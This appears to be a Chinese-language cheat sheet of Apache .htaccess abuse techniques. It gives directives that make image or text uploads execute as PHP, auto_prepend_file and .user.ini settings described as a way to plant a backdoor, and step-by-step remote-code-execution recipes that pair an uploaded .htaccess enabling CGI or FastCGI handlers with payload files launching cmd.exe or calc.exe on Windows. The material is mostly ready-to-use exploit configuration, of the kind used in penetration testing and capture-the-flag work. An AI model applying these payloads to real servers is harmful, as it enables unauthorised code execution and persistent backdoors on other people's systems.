# htaccess利用



## 收藏

[指令索引](http://httpd.apache.org/docs/2.4/mod/directives.html)

 https://www.freebuf.com/vuls/218495.html 

## 一些性质

在`.htaccess`文件中#与`\x00`为注释符号

## 开启条件



1. AllowOverride All
2. AllowOverride FileInfo

## \有点类似shell里的\

```
php_value auto_prepend_fi\
le ".htaccess"
```

可以成功执行

## 常用的设置命令

### 设置http头解析格式

`AddHandler php7-script .txt`

`AddType application/x-httpd-php .jpg`

`SetHandler application/x-httpd-php`



### 设置php.ini

`php_value pcre.backtrack_limit 0
php_value pcre.jit 0 `

### PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门

通过配置auto_append_file或auto_prepend_file可以向所有php文件中的开头或尾部插入指定的文件的内容。

在. htaccess中的写入如下：

```
php_value auto_prepend_file "/home/fdipzone/header.php"php_value auto_append_file "/home/fdipzone/footer.php"
```

对于CGI/FastCGI模式 PHP 5.3.0 以上版本，还可以使用 在目录下创建.user.ini文件 。来引入该参数。写法如下：

```
auto_prepend_file = 123.gif
```

## CGI启动方式的RCE利用姿势

### 利用条件

> 1.保证htaccess会被解析，即当前目录中配置了`AllowOverride all或AllowOverride Options FileInfo。AllowOverride参数具体作用可参考Apache之AllowOverride参数详解。(Require all granted也是需要的)
>
> 2.cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释。
>
> 3.有目录的上传、写入权限。

### 利用姿势

上传.htaccess 文件, 内容如下：

```
Options ExecCGI
AddHandler cgi-script .xx
```

Options ExecCGI表示允许CGI执行，如果AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。

第二句告诉Apache将xx后缀名的文件，当做CGI程序进行解析。

接下来，以Windows平台为例，上传poc.xx文件，内容如下：

```
#!C:/Windows/System32/cmd.exe /c start calc.exe
1
```

第一行用来表示CGI程序的路径。可以随便开你的脑洞。

因为CGI程序处理完成后，会被Apache关闭，所以我们这里要用启动新进程的方式来启动。

![image.png](https://ws1.sinaimg.cn/large/006pWR9agy1g9dtjch3qij31mw0j2gw3.jpg)



## FastCGI启动方式的RCE利用姿势

我们再来看看FastCGI模式的，这个依赖的是mod_fcgid.so，默认安装包里甚至没有这个so文件，不过在PHPStudy的默认配置中，就已经是加载了的，并且AllowOverride也是All权限，手动斜眼。

其实还有mod_proxy_fcgi，更为常见，也是默认开启的，还不清楚能否利用，表哥表姐们可以尝试一下。

### 利用条件

> 1.AllowOverride all或AllowOverride Options FileInfo。
>
> 2.mod_fcgid.so被加载。即apache配置文件中有LoadModule fcgid_module modules/mod_fcgid.so
>
> \3. 有目录的上传、写入权限。

### 利用姿势

上传.htaccess 文件, 内容如下：

```
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc
```

老样子，如果默认就开启了ExecCGI，则第一句可以省略。

第二句表示，abc后缀名的文件需要被fcgi来解析。AddHandler还可以换成AddType。

再上传1.abc。内容无所谓。

![image.png](https://ws1.sinaimg.cn/large/006pWR9aly1g9dthc893ej314b0b5abe.jpg)